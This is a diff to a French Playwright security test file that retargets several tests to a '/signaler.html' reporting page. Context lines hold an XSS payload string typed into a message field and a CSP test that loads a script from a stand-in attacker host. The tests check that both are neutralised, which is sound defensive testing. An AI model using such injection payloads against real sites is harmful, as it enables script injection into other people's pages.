@@ -47,7 +47,7 @@ test("ou signaler : plateforme officielle et liens sans referent", async ({ page
 });
 
 test("une injection dans le message reste du texte", async ({ page }) => {
-  await page.goto("/");
+  await page.goto("/signaler.html");
   await page.fill("#msg", '<img src=x onerror="window.__xss=1"><script>window.__xss=2</script> Bonjour, ceci est un essai.');
   await expect(page.locator("#preview")).toContainText("<img src=x");
   expect(await page.evaluate(() => window.__xss)).toBeUndefined();
@@ -55,7 +55,7 @@ test("une injection dans le message reste du texte", async ({ page }) => {
 });
 
 test("la page refuse d'etre encadree par un autre site", async ({ page }) => {
-  await page.setContent('<iframe id="f" src="http://127.0.0.1:4173/" width="800" height="600"></iframe>');
+  await page.setContent('<iframe id="f" src="http://127.0.0.1:4173/signaler.html" width="800" height="600"></iframe>');
   const cadre = page.frameLocator("#f");
   await page.waitForTimeout(1500);
   await expect(cadre.locator("#msg")).toHaveCount(0);
@@ -64,7 +64,7 @@ test("la page refuse d'etre encadree par un autre site", async ({ page }) => {
 test("la CSP bloque un script injecte depuis l'exterieur", async ({ page }) => {
   const violations = [];
   page.on("console", (m) => { if (/Content Security Policy/i.test(m.text())) violations.push(m.text()); });
-  await page.goto("/");
+  await page.goto("/signaler.html");
   await page.evaluate(() => {
     const s = document.createElement("script");
     s.src = "https://exemple-attaquant.invalid/x.js";
@@ -77,7 +77,7 @@ test("la CSP bloque un script injecte depuis l'exterieur", async ({ page }) => {
 test("lecture de capture : OCR sur l'appareil, sans envoi de l'image", async ({ page }) => {
   test.setTimeout(90000);
   const sorties = surveillerSorties(page);
-  await page.goto("/");
+  await page.goto("/signaler.html");
   // fabrique une capture d'ecran fictive dans le navigateur
   const png = await page.evaluate(() => {
     const c = document.createElement("canvas");
